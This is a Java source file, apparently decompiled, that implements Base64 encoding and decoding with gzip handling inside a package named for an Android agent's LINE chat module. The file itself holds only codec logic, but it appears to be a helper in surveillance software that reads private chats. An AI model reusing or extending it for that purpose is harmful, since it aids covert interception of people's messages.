package com.android.dvci.module.chat.line;

import android.util.Base64;
import android.util.Log;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.mm.M;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.zip.GZIPInputStream;

/**
 * Created by zad on 07/05/15.
 */
public class Base64impl {

	private static String TAG = "Base64impl";
	private static boolean a;
	private static byte[] b = {};
	private static byte[] c = {};
	private static byte[] d = {};
	private static byte[] e = {};
	private static byte[] f = {};
	private static byte[] g = {};

	static {
		int block256 = 256;
		int block64 = 64;
		boolean v0 = !Base64impl.class.desiredAssertionStatus() ? true : false;
		Base64impl.a = v0;
		Base64impl.b = new byte[]{65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83,
				84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108,
				109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 48, 49, 50, 51,
				52, 53, 54, 55, 56, 57, 43, 47};
		Base64impl.c = new byte[]{-9, -9, -9, -9, -9, -9, -9, -9, -9, -5, -5, -9, -9, -5, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -5, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, 62, -9, -9, -9, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -9, -9, -9,
				-1, -9, -9, -9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
				20, 21, 22, 23, 24, 25, -9, -9, -9, -9, -9, -9, 26, 27, 28, 29, 30, 31, 32, 33, 34,
				35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9};
		Base64impl.d = new byte[]{65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83,
				84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108,
				109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 48, 49, 50, 51,
				52, 53, 54, 55, 56, 57, 45, 95};
		Base64impl.e = new byte[]{-9, -9, -9, -9, -9, -9, -9, -9, -9, -5, -5, -9, -9, -5, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -5, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, 62, -9, -9, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -9, -9, -9,
				-1, -9, -9, -9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
				20, 21, 22, 23, 24, 25, -9, -9, -9, -9, 63, -9, 26, 27, 28, 29, 30, 31, 32, 33, 34,
				35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9};
		Base64impl.f = new byte[]{45, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70, 71, 72,
				73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 97, 98,
				99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115,
				116, 117, 118, 119, 120, 121, 122};
		Base64impl.g = new byte[]{-9, -9, -9, -9, -9, -9, -9, -9, -9, -5, -5, -9, -9, -5, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -5, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, 0, -9, -9, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, -9, -9, -9, -1, -9, -9,
				-9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
				31, 32, 33, 34, 35, 36, -9, -9, -9, -9, 37, -9, 38, 39, 40, 41, 42, 43, 44, 45, 46,
				47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9, -9,
				-9, -9, -9, -9};
	}

	private Base64impl() {
		super();
	}

	public static byte[] base64Impl(String arg1) throws IOException {
		byte[] res = Base64impl.decode(arg1);
		if (Cfg.DEBUG) {
			Check.log(TAG +  " (base64Impl): returning " + Base64impl.bytesToHex(res));
		}
		return res;
	}

	public static String a(byte[] arg3) {
		String v0;
		v0 = Base64impl.a(arg3, arg3.length);
		if (Base64impl.a) {
			if (!Base64impl.a && v0 == null) {
				throw new AssertionError();
			}
		}
		return v0;
	}

	private static String a(byte[] arg3, int arg4) {
		String v0_1;
		byte[] v1 = Base64impl.serialize(arg3, arg4);
		try {
			v0_1 = new String(v1, "US-ASCII");
		} catch (UnsupportedEncodingException v0) {
			v0_1 = new String(v1);
		}

		return v0_1;
	}

	private static byte[] serailize(byte[] arg5, int arg6, int arg7, byte[] arg8, int arg9) {
		byte v4 = 61;
		int v0 = 0;
		byte[] v3 = Base64impl.b;
		int v2 = arg7 > 0 ? arg5[arg6] << 24 >>> 8 : 0;
		int v1 = arg7 > 1 ? arg5[arg6 + 1] << 24 >>> 16 : 0;
		v1 |= v2;
		if (arg7 > 2) {
			v0 = arg5[arg6 + 2] << 24 >>> 24;
		}

		v0 |= v1;
		switch (arg7) {
			case 1: {
				arg8[arg9] = v3[v0 >>> 18];
				arg8[arg9 + 1] = v3[v0 >>> 12 & 63];
				arg8[arg9 + 2] = v4;
				arg8[arg9 + 3] = v4;
				break;
			}
			case 2: {
				arg8[arg9] = v3[v0 >>> 18];
				arg8[arg9 + 1] = v3[v0 >>> 12 & 63];
				arg8[arg9 + 2] = v3[v0 >>> 6 & 63];
				arg8[arg9 + 3] = v4;
				break;
			}
			case 3: {
				arg8[arg9] = v3[v0 >>> 18];
				arg8[arg9 + 1] = v3[v0 >>> 12 & 63];
				arg8[arg9 + 2] = v3[v0 >>> 6 & 63];
				arg8[arg9 + 3] = v3[v0 & 63];
				break;
			}
		}

		return arg8;
	}

	private static byte[] serialize(byte[] data, int offset) throws NullPointerException, IllegalArgumentException {
		byte[] v0_1;
		int v6 = 3;
		if (data == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG +  "(serialize) Cannot serialize null array.");
			}
			throw new NullPointerException("Cannot serialize null array.");

		}

		if (offset < 0) {
			if (Cfg.DEBUG) {
				Check.log(TAG +  "(serialize) Cannot have length offset: " + offset);
			}
			throw new IllegalArgumentException("Cannot have length offset: " + offset);
		}

		if (offset > data.length) {
			if (Cfg.DEBUG) {
				Check.log(TAG +  "(serialize) \"Cannot have offset of 0  and length of " + offset + "with array of length "+data.length);
			}
			throw new IllegalArgumentException(String.format("Cannot have offset of %d and length of %d with array of length %d",
					Integer.valueOf(0), Integer.valueOf(offset), Integer.valueOf(data.length)));
		}

		int v2 = offset / 3 * 4;
		int v0 = offset % 3 > 0 ? 4 : 0;
		byte[] v3_1 = new byte[v0 + v2];
		int v4 = offset - 2;
		v0 = 0;
		v2 = 0;
		while (v2 < v4) {
			Base64impl.serailize(data, v2, v6, v3_1, v0);
			v2 += 3;
			v0 += 4;
		}

		if (v2 < offset) {
			Base64impl.serailize(data, v2, offset - v2, v3_1, v0);
			v0 += 4;
		}

		if (v0 <= v3_1.length - 1) {
			byte[] v2_1 = new byte[v0];
			System.arraycopy(v3_1, 0, v2_1, 0, v0);
			v0_1 = v2_1;
		} else {
			v0_1 = v3_1;
		}

		return v0_1;
	}

	public static byte[] decode(String encodedText) throws IOException {
		GZIPInputStream v4_1;
		ByteArrayInputStream v4 = null;
		ByteArrayInputStream v5;
		ByteArrayOutputStream v2;
		byte[] encodedBytes;
		GZIPInputStream v3 = null;
		if (encodedText == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG +  "(decode) Input string was null.");
			}
			throw new NullPointerException("Input string was null.");
		}

		try {
			encodedBytes = encodedText.getBytes("US-ASCII");
		} catch (UnsupportedEncodingException v0) {
			if (Cfg.DEBUG) {
				Check.log(TAG +  "(decode) not US-ASCII string.");
			}
			encodedBytes = encodedText.getBytes();
		}

		encodedBytes = Base64impl.decodeByteArray(encodedBytes, encodedBytes.length);
		if (encodedBytes.length < 4) {
			return encodedBytes;
		}

		if (35615 != (encodedBytes[0] & 255 | encodedBytes[1] << 8 & 65280)) {
			return encodedBytes;
		}

		byte[] v1 = new byte[2048];
		v2 = new ByteArrayOutputStream();

		try {
			v5 = new ByteArrayInputStream(encodedBytes);
		} catch (Throwable v0_2) {


			v5 = new ByteArrayInputStream(v3.toString().getBytes("UTF-8"));
			//label_58
			try {
				v2.close();
				if (v3 != null) {
					v3.close();
				}
				if (v4 != null) {
					v4.close();
				}
				if (v5 != null) {
					v5.close();
				}
			} catch (Exception e) {
			}
			return encodedBytes;
		}

		try {
			v4_1 = new GZIPInputStream(((InputStream) v5));
		} catch (Throwable v0_2) {
			//label_58
			try {
				v2.close();
				if (v3 != null) {
					v3.close();
				}
				if (v4 != null) {
					v4.close();
				}
				if (v5 != null) {
					v5.close();
				}
			} catch (Exception e) {
			}
			return encodedBytes;
		}

		try {
			while (true) {
				int v3_1 = v4_1.read(v1);
				if (v3_1 < 0) {
					break;
				}

				v2.write(v1, 0, v3_1);
			}

			encodedBytes = v2.toByteArray();
		} catch (Throwable v0_2) {
			v3 = v4_1;
			//label_58
			try {
				v2.close();
				if (v3 != null) {
					v3.close();
				}
				if (v4 != null) {
					v4.close();
				}
				if (v5 != null) {
					v5.close();
				}
			} catch (Exception e) {
			}
			return encodedBytes;
		}


		try {
			v2.close();

		} catch (Exception v1_2) {
		}

		try {
			v4_1.close();
		} catch (Exception v1_2) {
		}

		try {
			if (v3 != null) {
				v3.close();
			}
			if (v4 != null) {
				v4.close();
			}
			if (v5 != null) {
				v5.close();
			}
			return encodedBytes;
		} catch (Exception v1_2) {
			return encodedBytes;
		} catch (Throwable v0_2) {
			v5 = v4;
			//label_58
			try {
				v2.close();
				if (v3 != null) {
					v3.close();
				}
				if (v4 != null) {
					v4.close();
				}
			} catch (Exception e) {
			}
			return encodedBytes;
		}

	}

	public static byte[] b(byte[] arg4) {
		byte[] v0 = {};
		try {
			v0 = Base64impl.serialize(arg4, arg4.length);
		} catch (IllegalArgumentException v1) {
			if (Base64impl.a) {
				return v0;
			}

			throw new AssertionError("IOExceptions only come from GZipping, which is turned off: " +
					v1.getMessage());
		}

		return v0;
	}


	private static byte[] decodeByteArray(byte[] sourceBytes, int arg14) throws IOException {
		int v0_1;
		byte[] v0;
		int v12 = 61;
		int v3 = 3;
		if (sourceBytes == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(decodeByteArray) Cannot decode null source array.");
			}
			throw new NullPointerException("Cannot decode null source array.");
		}

		if (arg14 > sourceBytes.length) {
			Object[] v3_1 = new Object[v3];
			v3_1[0] = Integer.valueOf(sourceBytes.length);
			v3_1[1] = Integer.valueOf(0);
			v3_1[2] = Integer.valueOf(arg14);
			if (Cfg.DEBUG) {
				Check.log(TAG +  "(decodeByteArray) "+String.format("Source array with length %d cannot have offset of %d and process %d bytes.",
						v3_1));
			}
			throw new IllegalArgumentException(String.format("Source array with length %d cannot have offset of %d and process %d bytes.",
					v3_1));
		}

		if (arg14 == 0) {
			v0 = new byte[0];
		} else if (arg14 < 4) {
			if (Cfg.DEBUG) {
				Check.log(TAG +  "(decodeByteArray) Base64-encoded string must have at least four characters, but length specified was "
						+ arg14);
			}
			throw new IllegalArgumentException("Base64-encoded string must have at least four characters, but length specified was "
					+ arg14);
		} else {
			byte[] v8 = Base64impl.c;
			byte[] v9 = new byte[arg14 * 3 / 4];
			byte[] v10 = new byte[4];
			int v7 = 0;
			int v5 = 0;
			int v6 = 0;
			boolean shallThrow = true;
			while (true) {
				if (v7 < arg14) {
					v0_1 = v8[sourceBytes[v7] & 255];
					if (v0_1 >= -5) {
						if (v0_1 >= -1) {
							v0_1 = v5 + 1;
							v10[v5] = sourceBytes[v7];
							if (v0_1 > v3) {
								if (v6 >= 0 && v6 + 2 < v9.length) {
									v0 = Base64impl.c;
									if (v10[2] == v12) {
										v9[v6] = ((byte) (((v0[v10[1]] & 255) << 12 | (v0[v10[0]] & 255)
												<< 18) >>> 16));
										v0_1 = 1;
									} else if (v10[v3] == v12) {
										v0_1 = (v0[v10[2]] & 255) << 6 | ((v0[v10[0]] & 255) << 18 | (
												v0[v10[1]] & 255) << 12);
										v9[v6] = ((byte) (v0_1 >>> 16));
										v9[v6 + 1] = ((byte) (v0_1 >>> 8));
										v0_1 = 2;
									} else {
										v0_1 = v0[v10[v3]] & 255 | ((v0[v10[0]] & 255) << 18 | (v0[v10[
												1]] & 255) << 12 | (v0[v10[2]] & 255) << 6);
										v9[v6] = ((byte) (v0_1 >> 16));
										v9[v6 + 1] = ((byte) (v0_1 >> 8));
										v9[v6 + 2] = ((byte) v0_1);
										v0_1 = v3;
									}

									v0_1 += v6;
									if (sourceBytes[v7] == v12) {
										//goto label_95;
										byte[] v1 = new byte[v0_1];
										System.arraycopy(v9, 0, v1, 0, v0_1);
										v0 = v1;
										return v0;
									}

									v5 = v0_1;
									v0_1 = 0;
									//goto label_168;
									++v7;
									v6 = v5;
									v5 = v0_1;
									continue;
								}
								if (Cfg.DEBUG) {
									Check.log(TAG + "(decodeByteArray) " + String.format("Destination array with length %d cannot have offset of %d and still store three bytes.",
											Integer.valueOf(v9.length), Integer.valueOf(v6)));
								}
								throw new IllegalArgumentException(String.format("Destination array with length %d cannot have offset of %d and still store three bytes.",
										Integer.valueOf(v9.length), Integer.valueOf(v6)));
							} else {
								v5 = v6;
							}
						} else {
							v0_1 = v5;
							v5 = v6;
						}

						label_168:
						++v7;
						v6 = v5;
						v5 = v0_1;
						continue;
					} else {
						break;
					}
				} else {
					//goto label_178;
					shallThrow = false;
					break;
				}
			}
			if (shallThrow) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(decodeByteArray) " + String.format("Bad Base64 input character decimal %d in array position %d",
							Integer.valueOf(sourceBytes[v7] & 255), Integer.valueOf(v7)));
				}
				throw new IOException(String.format(M.e("Bad Base64 input character decimal %d in array position %d"),
						Integer.valueOf(sourceBytes[v7] & 255), Integer.valueOf(v7)));

			}
			//label_178:
			v0_1 = v6;
			//label_95:
			byte[] v1 = new byte[v0_1];
			System.arraycopy(v9, 0, v1, 0, v0_1);
			v0 = v1;
		}

		return v0;
	}


	public static byte[] c(byte[] arg1) throws IOException {
		return Base64impl.decodeByteArray(arg1, arg1.length);
	}

	public static String bytesToHex(byte[] bytes) {
	final char[] hexArray = M.e("0123456789ABCDEF").toCharArray();
    char[] hexChars = new char[bytes.length * 2];
    for ( int j = 0; j < bytes.length; j++ ) {
        int v = bytes[j] & 0xFF;
        hexChars[j * 2] = hexArray[v >>> 4];
        hexChars[j * 2 + 1] = hexArray[v & 0x0F];
    }
    return new String(hexChars);
}


}
